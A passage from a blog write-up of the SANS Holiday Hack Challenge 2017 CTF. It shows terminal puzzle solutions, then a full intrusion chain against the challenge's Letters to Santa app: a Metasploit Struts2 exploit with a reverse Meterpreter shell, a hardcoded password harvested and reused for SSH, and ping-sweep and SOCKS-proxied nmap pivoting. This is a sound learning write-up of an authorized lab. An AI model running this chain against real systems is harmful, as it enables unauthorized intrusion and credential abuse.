In <a class="reference external" href="https://twitter.com/GlitteryElf/status/938539753372237824">this tweet</a>,
she mentions having problems with a malicious alias. Let's run <code>alias</code>
on the box to see what's what:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@b21389dba617:~$</span> <span class="nb">alias</span>
<span class="go">alias alert=&#39;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#39;\&#39;&#39;s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//&#39;\&#39;&#39;)&quot;&#39;</span>
<span class="go">alias egrep=&#39;egrep --color=auto&#39;</span>
<span class="go">alias fgrep=&#39;fgrep --color=auto&#39;</span>
<span class="go">alias grep=&#39;grep --color=auto&#39;</span>
<span class="hll"><span class="go">alias kill=&#39;true&#39;</span>
</span><span class="hll"><span class="go">alias killall=&#39;true&#39;</span>
</span><span class="go">alias l=&#39;ls -CF&#39;</span>
<span class="go">alias la=&#39;ls -A&#39;</span>
<span class="go">alias ll=&#39;ls -alF&#39;</span>
<span class="go">alias ls=&#39;ls --color=auto&#39;</span>
<span class="hll"><span class="go">alias pkill=&#39;true&#39;</span>
</span><span class="hll"><span class="go">alias skill=&#39;true&#39;</span>
</span></pre></div>
<p>Ah! There are aliases that prevent us from using <code>kill</code> and the like,
which explains why our earlier <code>kill</code> command didn't do anything. We
can redefine the aliases, or directly call the binaries.</p>
<div class="highlight"><pre><span></span><span class="gp">elf@b21389dba617:~$</span> which <span class="nb">kill</span>
<span class="go">/bin/kill</span>
<span class="gp">elf@b21389dba617:~$</span> ps aux <span class="p">|</span> grep santaslittlehelperd
<span class="go">elf          8  0.0  0.0   4224   624 pts/0    S    17:29   0:00 /usr/bin/santaslittlehelperd</span>
<span class="go">elf        139  0.0  0.0  11284  1024 pts/0    S+   17:31   0:00 grep --color=auto santaslittlehelperd</span>
<span class="gp">elf@b21389dba617:~$</span> /bin/kill -9 <span class="m">8</span>
<span class="gp">elf@b21389dba617:~$</span> ps aux <span class="p">|</span> grep santaslittlehelperd
<span class="go">elf        148  0.0  0.0  11284   992 pts/0    S+   17:31   0:00 grep --color=auto santaslittlehelperd</span>
</pre></div>
</div>
<div class="section" id="id3">
<h4><a class="toc-backref" href="#id26">Redirecting the snowball</a></h4>
<p>Anyway, since we managed to kill the process, we're given a new object: the
Candy Cane, which can redirect the snowball.</p>
<img alt="winconceivable_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/winconceivable_terminal.png" />
<p>Now here's the layout I used to redirect the snowball:</p>
<img alt="winconceivable_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/winconceivable_snowball.gif" />
</div>
</div>
<div class="section" id="north-pole-christmas-town-infrastructure-letters-to-santa-application">
<h3><a class="toc-backref" href="#id27">North Pole Christmas Town infrastructure: Letters to Santa application</a></h3>
<p>The North Pole fine folks host a web application, where all good boys and girls
can send a letter to Santa, requesting their favorite toys:</p>
<img alt="l2s_application.png" class="align-center" src="/images/sans-christmas-challenge-2017/l2s_application.png" />
<p>The question specifies that there is a page of <em>The Great Book</em> at the web root
of the server. Let's see, the name of the first page was
<code>GreatBookPage1.pdf</code>. Now, what could possibly be the name of this
second page... You guessed it, if you browse directly to the URL
<a class="reference external" href="https://l2s.northpolechristmastown.com/GreatBookPage2.pdf">https://l2s.northpolechristmastown.com/GreatBookPage2.pdf</a>, you get direct
access to the <a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage2.pdf">second page of The Great Book</a> (sha256: <code>c4983d87ac8debc02a07d586ea9e43839ba081a426b5c490ceadb830c1cc3d4f</code>):</p>
<blockquote>
<p>On the Topic of Flying Animals</p>
<p>Originally, only birds could fly in Oz. But, throughout the land, it was
universally recognized that other flying animals would bring great economic
benefits - faster transportation, decreased shipping costs, and a certain
whimsicality that would likely increase tourism. Oz's greatest scientific
minds were tasked with the creation of such beasts. Unfortunately, the
actual development of flying animal species was plagued with unforeseen
difficulties.</p>
<p>The first attempt, a single flying lion name Moonracer, was deemed a
failure. Although the lion could indeed fly, children responded in abject
terror at his fearsome appearance. The Oz Chamber of Commerce demanded that
scientists choose a species less formidable than a lion.</p>
<p>Hoping to correct their error, Ozian scientists next grafted wings onto
monkeys, hoping that inherent simian cutenes would prevail. Alas, winged
monkeys proved even more horrific than the flying lion.</p>
<p>The exasperated scientists then made their third and final attempt - flying
reindeer. Through intense research, they devised an incredible
technological advancement, that would allow reindeer to fly without wings!
It was an unparalleled genetic and aerodynamic achievement.</p>
<p>Yet, even this advance was accompanied by a slight concern. The
deep-seated genetic alterations introduced to support wingless flight
resulted in an infinitesimally small probability of a significant side
effect: a one-in-a-million chance that a reindeer would one day be born
with a brilliantly shiny red nose. Some of the scientists posited such a
reindeer's nose would even glow. Despite this change, the reserachers
charged ahead to breed an entire herd of such flying reindeer. And, for
centuries, the &quot;red nose&quot; phenomenon was never observed in the wild.</p>
<p>Although the flying reindeer were a technological marvel and achieved
enormous success in Oz, The Great Schism changed everything. During the
separation negotiations, the Wizard of Oz and Santa Claus both decided that
Moonrancer and the reindeer would be moved to the North Pole, while the
flying monleys would remain in Oz.</p>
</blockquote>
<p>Now let's try to pwn this application, in order to get access to the internal
network. If we take a look at the source code of the application, we find
something interesting:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>


<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;IE=edge&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Toys List<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/js/jquery.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/css/materialize.min.css&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/js/materialize.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;description&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;North Pole Letters to Santa&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;keywords&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;North,Pole,Letters,Santa,toy,request&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;author&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;Alabaster Snowball&quot;</span><span class="p">&gt;</span>
[...]
    <span class="c">&lt;!-- Development version --&gt;</span>
<span class="hll">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://dev.northpolechristmastown.com&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;display: none;&quot;</span><span class="p">&gt;</span>Access Development Version<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></pre></div>
<p>There seems to be a hidden link, to a development version of the application:</p>
<img alt="dev_toy_index.png" class="align-center" src="/images/sans-christmas-challenge-2017/dev_toy_index.png" />
<p>Users can manually request toys:</p>
<img alt="dev_toy_request.png" class="align-center" src="/images/sans-christmas-challenge-2017/dev_toy_request.png" />
<p>Did you notice something interesting in the above screenshots? Let's take a
closer look:</p>
<img alt="dev_toy_struts.png" class="align-center" src="/images/sans-christmas-challenge-2017/dev_toy_struts.png" />
<p>This server is using Apache Struts as the application framework! Many of you
know that Struts was affected by a <a class="reference external" href="https://cwiki.apache.org/confluence/display/WW/S2-052">pretty serious vulnerability</a>
this year, which leads to unauthenticated remote code execution.</p>
<p>Let's use our <a class="reference external" href="https://github.com/rapid7/metasploit-framework">favorite exploitation framework</a>
to get a shell on this webserver. I installed Metasploit on a public-facing
server of mine. SANS helpfully <a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">posted instructions</a>
on how to register to the free-tier AWS offers if you don't already have a
public-facing server.</p>
<div class="highlight"><pre><span></span><span class="go">msf exploit(multi/http/struts2_rest_xstream) &gt; options</span>

<span class="go">Module options (exploit/multi/http/struts2_rest_xstream):</span>

<span class="go">   Name       Current Setting                 Required  Description</span>
<span class="go">   ----       ---------------                 --------  -----------</span>
<span class="go">   Proxies                                    no        A proxy chain of format type:host:port[,type:host:port][...]</span>
<span class="go">   RHOST      dev.northpolechristmastown.com  yes       The target address</span>
<span class="go">   RPORT      443                             yes       The target port (TCP)</span>
<span class="go">   SRVHOST    0.0.0.0                         yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span>
<span class="go">   SRVPORT    80                              yes       The local port to listen on.</span>
<span class="go">   SSL        true                            no        Negotiate SSL/TLS for outgoing connections</span>
<span class="go">   SSLCert                                    no        Path to a custom SSL certificate (default is randomly generated)</span>
<span class="go">   TARGETURI  /orders/3043                    yes       Path to Struts action</span>
<span class="go">   URIPATH                                    no        The URI to use for this exploit (default is random)</span>
<span class="go">   VHOST                                      no        HTTP server virtual host</span>


<span class="go">Payload options (python/meterpreter/reverse_https):</span>

<span class="go">   Name   Current Setting        Required  Description</span>
<span class="go">   ----   ---------------        --------  -----------</span>
<span class="go">   LHOST  X.X.X.X                yes       The local listener hostname</span>
<span class="go">   LPORT  443                    yes       The local listener port</span>
<span class="go">   LURI                          no        The HTTP Path</span>


<span class="go">Exploit target:</span>

<span class="go">   Id  Name</span>
<span class="go">   --  ----</span>
<span class="go">   1   Python (In-Memory)</span>


<span class="go">msf exploit(multi/http/struts2_rest_xstream) &gt; exploit</span>

<span class="go">[-] Handler failed to bind to 163.172.50.13:443</span>
<span class="go">[*] Started HTTPS reverse handler on https://0.0.0.0:443</span>
<span class="go">[*] https://X.X.X.X:443 handling request from X.X.X.X; (UUID: oqqwyeik) Staging python payload (43883 bytes) ...</span>
<span class="go">[*] Meterpreter session 1 opened (Y.Y.Y.Y:443 -&gt; X.X.X.X:50354) at 2017-12-24 16:56:24 +0100</span>

<span class="go">meterpreter &gt; getuid</span>
<span class="go">Server username: alabaster_snowball</span>
</pre></div>
<p>Alright, we have a Meterpreter shell on the server!</p>
<img alt="l2s_meterpreter.gif" class="align-center" src="/images/sans-christmas-challenge-2017/l2s_meterpreter.gif" />
<p>Let's take a look at <code>/var/www/html</code>, which is the web root according to
the nginx configuration file found on the server:</p>
<div class="highlight"><pre><span></span><span class="go">meterpreter &gt; ls -l /var/www/html/*.pdf</span>
<span class="go">Listing: /var/www/html/*.pdf</span>
<span class="go">============================</span>

<span class="go">Mode              Size     Type  Last modified              Name</span>
<span class="go">----              ----     ----  -------------              ----</span>
<span class="go">100444/r--r--r--  1764298  fil   2017-12-05 18:27:15 +0100  GreatBookPage2.pdf</span>
</pre></div>
<p>We see our second page, which we found earlier via forceful browsing. So even
if the name had not been predictable, we would have been able to find this
page.</p>
<p>Now, the goal is to find Alabaster Snowball's password. I first tried to
escalate my privileges on the server, in order to get access to the
<code>/etc/shadow</code> file, but I didn't succeed. So, let's find another way.</p>
<p>Let's take a look at listening sockets:</p>
<div class="highlight"><pre><span></span><span class="go">meterpreter &gt; shell</span>
<span class="go">Process 20555 created.</span>
<span class="go">Channel 7 created.</span>
<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
<span class="gp">$</span> netstat -tlpn
<span class="go">(Not all processes could be identified, non-owned process info</span>
<span class="go"> will not be shown, you would have to be root to see it all.)</span>
<span class="go">Active Internet connections (only servers)</span>
<span class="go">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span>
<span class="go">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span>
<span class="go">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span>
<span class="go">tcp        6      0 0.0.0.0:9000            0.0.0.0:*               LISTEN      11043/python</span>
<span class="hll"><span class="go">tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      790/java</span>
</span><span class="go">tcp6       0      0 :::22                   :::*                    LISTEN      -</span>
<span class="hll"><span class="go">tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      790/java</span>
</span></pre></div>
<p>We can see that our user is running a Java program, with the PID 790. Let's
get details on this process:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ps aux <span class="p">|</span> grep -w <span class="m">790</span>
<span class="go">alabast+   790  5.0  2.0 939444 630656 ?       Sl   03:01  43:43 /opt/jre/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dfile.encoding=UTF-8 -Dnet.sf.ehcache.skipUpdateCheck=true -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:MaxPermSize=128m -Xms512m -Xmx512m -Djava.endorsed.dirs=/opt/apache-tomcat/endorsed -classpath /opt/apache-tomcat/bin/bootstrap.jar -Dcatalina.base=/opt/apache-tomcat -Dcatalina.home=/opt/apache-tomcat -Djava.io.tmpdir=/opt/apache-tomcat/temp org.apache.catalina.startup.Bootstrap start</span>
</pre></div>
<p>Our user is running the Apache Tomcat server. The different Java resources
seem to be installed in <code>/opt</code>. Let's take a look at the files there.
There may indeed be configuration files containing our current user's password:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep -A <span class="m">1</span> -Rn alabaster_snowball /opt
<span class="go">/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:3:            final String username = &quot;alabaster_snowball&quot;;</span>
<span class="hll"><span class="go">/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-4-            final String password = &quot;stream_unhappy_buy_loss&quot;;</span>
</span></pre></div>
<p>Bingo, we got a password for our user, but it seems to be for a MySQL
connection. Let's see if our user used the same password for their system
password. Our pwned server has an SSH server accessible from the Internet:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> nmap -p <span class="m">22</span> dev.northpolechristmastown.com

<span class="go">Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-24 18:40 CET</span>
<span class="go">Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)</span>
<span class="go">Host is up (0.18s latency).</span>
<span class="go">rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">22/tcp open  ssh</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds</span>
<span class="gp">$</span> ssh alabaster_snowball@dev.northpolechristmastown.com
<span class="go">alabaster_snowball@dev.northpolechristmastown.com&#39;s password: stream_unhappy_buy_loss</span>
<span class="gp">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.FcLiqpWNISKoESUcwo5Jip8O$</span> hostname
<span class="go">hhc17-apache-struts1</span>
<span class="gp">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.FcLiqpWNISKoESUcwo5Jip8O$</span>
</pre></div>
<p>Alright! The password <code>stream_unhappy_buy_loss</code> also works for the
system account. Let's the internal IP address of the system:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ifconfig eth0
<span class="go">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1460</span>
<span class="hll"><span class="go">        inet 10.142.0.3  netmask 255.255.255.255  broadcast 10.142.0.3</span>
</span><span class="go">        ether 42:01:0a:8e:00:03  txqueuelen 1000  (Ethernet)</span>
<span class="go">        RX packets 4837274  bytes 1254973259 (1.1 GiB)</span>
<span class="go">        RX errors 0  dropped 0  overruns 0  frame 4</span>
<span class="go">        TX packets 11266245  bytes 3876810300 (3.6 GiB)</span>
<span class="go">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span>
</pre></div>
<p>Alright, we have access to the 10.142.0.0/24 network, which is in scope! Let's
what IP addresses are up. For this I use a custom one-liner, launched directly
on the machine:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nv">prefix</span><span class="o">=</span><span class="m">10</span>.142.0<span class="p">;</span> <span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> <span class="m">254</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span> ping -c <span class="m">1</span> -W <span class="m">1</span> <span class="nv">$prefix</span>.<span class="nv">$i</span> &gt; /dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$prefix</span><span class="s2">.</span><span class="nv">$i</span><span class="s2"> is up&quot;</span><span class="p">;</span> <span class="k">done</span>
<span class="go">10.142.0.2 is up</span>
<span class="go">10.142.0.3 is up</span>
<span class="go">10.142.0.5 is up</span>
<span class="go">10.142.0.6 is up</span>
<span class="go">10.142.0.7 is up</span>
<span class="go">10.142.0.8 is up</span>
<span class="go">10.142.0.11 is up</span>
<span class="go">10.142.0.13 is up</span>
</pre></div>
<p>Now that we know which IPs are up, let's perform a port scan. Luckily,
<code>nmap</code> is installed on the server, so we can use it. But let's say that
<code>nmap</code> isn't installed on the machine: in a real world example, this
would most likely be the case, and that's how I did it (it didn't even cross
my mind that <code>nmap</code> could be installed, and I just checked when writing
this write-up).</p>
<p>Now that we have valid SSH credentials, we can create a SOCKS proxy using the
<code>-D</code> option. We can then use a tool like <code>proxychains</code> to redirect
our different tools through our SOCKS proxy:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="c1"># in one terminal</span>
<span class="gp">$</span> ssh -D <span class="m">4242</span> alabaster_snowball@dev.northpolechristmastown.com
</pre></div>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="c1"># in another terminal</span>
<span class="gp">$</span> tail -n <span class="m">6</span> /etc/proxychains.conf
<span class="go">[ProxyList]</span>
<span class="gp">#</span> add proxy here ...
<span class="gp">#</span> meanwile
<span class="gp">#</span> defaults <span class="nb">set</span> to <span class="s2">&quot;tor&quot;</span>
<span class="go">socks4     127.0.0.1 4242 # modify here in your configuration file</span>
<span class="gp">$</span> proxychains nmap -sT -Pn --top-port <span class="m">10</span> --open -iL ./up_ips.txt
<span class="go">[snip]</span>
</pre></div>
<p>Now you may notice that I just scanned the top 10 TCP ports. Indeed, scanning
port through a SOCKS proxy can take quite some time, because of the overhead,
so most of the time I just bother to scan the top 10 TCP ports.</p>
<p>Now, since <code>nmap</code> is installed on our compromised machine, let's do a
more thorough scan, directly from the <code>hhc17-apache-struts1</code> machine:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> nmap --open <span class="m">10</span>.142.0.0/24 -oA tcp_top_1000_10.142.0.0.24

<span class="go">Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-25 23:04 UTC</span>
<span class="go">Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)</span>
<span class="go">Host is up (0.00021s latency).</span>
<span class="go">Not shown: 996 closed ports</span>
<span class="go">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">22/tcp   open  ssh</span>
<span class="go">80/tcp   open  http</span>
<span class="go">443/tcp  open  https</span>
<span class="go">2222/tcp open  EtherNetIP-1</span>

<span class="go">Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)</span>
<span class="go">Host is up (0.00021s latency).</span>
<span class="go">Not shown: 998 closed ports</span>
<span class="go">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">22/tcp open  ssh</span>
<span class="go">80/tcp open  http</span>

<span class="go">Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)</span>
<span class="go">Host is up (0.00016s latency).</span>
<span class="go">Not shown: 994 closed ports</span>
<span class="go">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">22/tcp   open  ssh</span>
<span class="go">25/tcp   open  smtp</span>
<span class="go">80/tcp   open  http</span>
<span class="go">143/tcp  open  imap</span>
<span class="go">2525/tcp open  ms-v-worlds</span>
<span class="go">3000/tcp open  ppp</span>

<span class="go">Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)</span>
<span class="go">Host is up (0.00013s latency).</span>
<span class="go">Not shown: 996 closed ports</span>
<span class="go">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">22/tcp   open  ssh</span>
<span class="go">80/tcp   open  http</span>
<span class="go">389/tcp  open  ldap</span>
<span class="go">8080/tcp open  http-proxy</span>

<span class="go">Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)</span>
<span class="go">Host is up (0.00052s latency).</span>
<span class="go">Not shown: 996 filtered ports</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">135/tcp  open  msrpc</span>
<span class="go">139/tcp  open  netbios-ssn</span>
<span class="go">445/tcp  open  microsoft-ds</span>
<span class="go">3389/tcp open  ms-wbt-server</span>

<span class="go">Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)</span>
<span class="go">Host is up (0.00018s latency).</span>
<span class="go">Not shown: 960 closed ports, 35 filtered ports</span>
<span class="go">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">80/tcp   open  http</span>
<span class="go">135/tcp  open  msrpc</span>
<span class="go">139/tcp  open  netbios-ssn</span>
<span class="go">445/tcp  open  microsoft-ds</span>
<span class="go">3389/tcp open  ms-wbt-server</span>

<span class="go">Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)</span>
<span class="go">Host is up (0.00023s latency).</span>
<span class="go">Not shown: 996 closed ports</span>
<span class="go">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">22/tcp   open  ssh</span>
<span class="go">80/tcp   open  http</span>
<span class="go">4443/tcp open  pharos</span>
<span class="go">9090/tcp open  zeus-admin</span>

<span class="go">Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)</span>
<span class="go">Host is up (0.0045s latency).</span>
<span class="go">Not shown: 998 filtered ports</span>
<span class="go">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">80/tcp   open  http</span>
<span class="go">3389/tcp open  ms-wbt-server</span>

<span class="go">Nmap done: 256 IP addresses (7 hosts up) scanned in 7.17 seconds</span>
</pre></div>
<p>We now have a better view of the internal network.</p>
</div>
</div>
<div class="section" id="third-page-of-the-great-book">
<h2><a class="toc-backref" href="#id28">Third page of <em>The Great Book</em></a></h2>
<div class="section" id="north-pole-and-beyond-cryokinetic-magic">
<h3><a class="toc-backref" href="#id29">North Pole and Beyond: Cryokinetic Magic</a></h3>
<div class="section" id="id4">
<h4><a class="toc-backref" href="#id30">Cranberry Pi: Yannick's (dirty) solution</a></h4>
<pre class="literal-block">
                     ___
                    / __'.     .-&quot;&quot;&quot;-.
              .-&quot;&quot;-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-&quot; &quot;-:_,(o:==..`-. '.         .-&quot;-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--&quot;&quot;--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.

Run the CandyCaneStriper executable to complete this challenge.
</pre>
<p>Ok, so we just have to execute the <code>CandyCaneStripper</code> executable, let's
take a look at it:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@cd14b3563680:~$</span> ls -lh
<span class="go">total 48K</span>
<span class="go">-rw-r--r-- 1 root root 45K Dec 15 19:59 CandyCaneStriper</span>
</pre></div>
<p>The <code>CandyCaneStripper</code> file is <strong>not</strong> marked as executable. So we can't
launch it. Let's <code>chmod</code> it to add the executable flag:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@cd14b3563680:~$</span> chmod +x ./CandyCaneStriper
<span class="gp">elf@cd14b3563680:~$</span> ls -lh CandyCaneStriper
<span class="go">-rw-r--r-- 1 root root 45K Dec 15 19:59 CandyCaneStriper</span>
</pre></div>
<p>Hmm, it didn't work. Let's take a look at the <code>chmod</code> executable:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@cd14b3563680:~$</span> which chmod
<span class="go">/bin/chmod</span>
<span class="gp">elf@cd14b3563680:~$</span> file /bin/chmod
<span class="go">/bin/chmod: empty</span>
</pre></div>
<p>The <code>chmod</code> executable is empty, so we don't have it. We can't use the
same trick as for the <code>find</code> executable from &quot;Winter Wonder Landing&quot;,
because it involded using <code>chmod</code> to mark our new program as executable.
We seem to be stuck in a <a class="reference external" href="https://en.wikipedia.org/wiki/Catch-22_(logic)">Catch-22 logic</a>.
So, let's see how we can change our program's attributes, without relying on
<code>chmod</code>.</p>
<p>This <a class="reference external" href="https://unix.stackexchange.com/a/83979">Stack Exchange answer</a> gives
us several possibilities. I used the first one:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@cd14b3563680:~$</span> cp /bin/ls ./CandyCaneStriper_from_ls
<span class="gp">elf@cd14b3563680:~$</span> cp ./CandyCaneStriper ./CandyCaneStriper_from_ls
<span class="gp">elf@cd14b3563680:~$</span> ls -lh CandyCaneStriper_from_ls
<span class="go">-rwxr-xr-x 1 elf elf 45K Dec 23 18:57 CandyCaneStriper_from_ls</span>
<span class="gp">elf@cd14b3563680:~$</span> ./CandyCaneStriper_from_ls
<span class="go">                   _..._</span>
<span class="go">                 .&#39;\\ //`,</span>
<span class="go">                /\\.&#39;``&#39;.=&quot;,</span>
<span class="go">               / \/     ;==|</span>
<span class="go">              /\\/    .&#39;\`,`</span>
<span class="go">             / \/     `&quot;&quot;`</span>
<span class="go">            /\\/</span>
<span class="go">           /\\/</span>
<span class="go">          /\ /</span>
<span class="go">         /\\/</span>
<span class="go">        /`\/</span>
<span class="go">        \\/</span>
<span class="go">         `</span>
<span class="go">The candy cane striping machine is up and running!</span>
</pre></div>
</div>
<div class="section" id="id5">
<h4><a class="toc-backref" href="#id31">Cranberry Pi: the &quot;official&quot; solution</a></h4>
<p>Having managed to execute the program, I decided to take a look at <a class="reference external" href="https://twitter.com/GreenesterElf">Holly
Evergreen's Twitter profile</a>. In <a class="reference external" href="https://twitter.com/GreenesterElf/status/938544194070634496">this
tweet</a>, she
points to a <a class="reference external" href="https://superuser.com/questions/341439/can-i-execute-a-linux-binary-without-the-execute-permission-bit-being-set">Super User answer</a>,
which explains how to execute a program that is not marked as executable.</p>
<p>The accepted answer says that we can use the program linker/loader as an
interpreter. Let's give it a try:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@fea39a7c28e3:~$</span> ls -lh ./CandyCaneStriper
<span class="go">-rw-r--r-- 1 root root 45K Dec 15 19:59 ./CandyCaneStriper</span>
<span class="gp">elf@fea39a7c28e3:~$</span> /lib/x86_64-linux-gnu/ld-2.23.so ./CandyCaneStriper
<span class="go">                   _..._</span>
<span class="go">                 .&#39;\\ //`,</span>
<span class="go">                /\\.&#39;``&#39;.=&quot;,</span>
<span class="go">               / \/     ;==|</span>
<span class="go">              /\\/    .&#39;\`,`</span>
<span class="go">             / \/     `&quot;&quot;`</span>
<span class="go">            /\\/</span>
<span class="go">           /\\/</span>
<span class="go">          /\ /</span>
<span class="go">         /\\/</span>
<span class="go">        /`\/</span>
<span class="go">        \\/</span>
<span class="go">         `</span>
<span class="go">The candy cane striping machine is up and running!</span>
</pre></div>
<p>And it worked, indeed! TIL you can execute a program without it being marked
as executable.</p>
</div>
<div class="section" id="id6">
<h4><a class="toc-backref" href="#id32">Redirecting the snowball</a></h4>
<p>Since we managed to execute the program, we get a new tool: the Thermite, which
can melts the snowball, reduce its size, and thus modify its speed.</p>
<img alt="cryokinetic_magic_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/cryokinetic_magic_terminal.png" />
<p>Now here's the layout I used to redirect the snowball:</p>
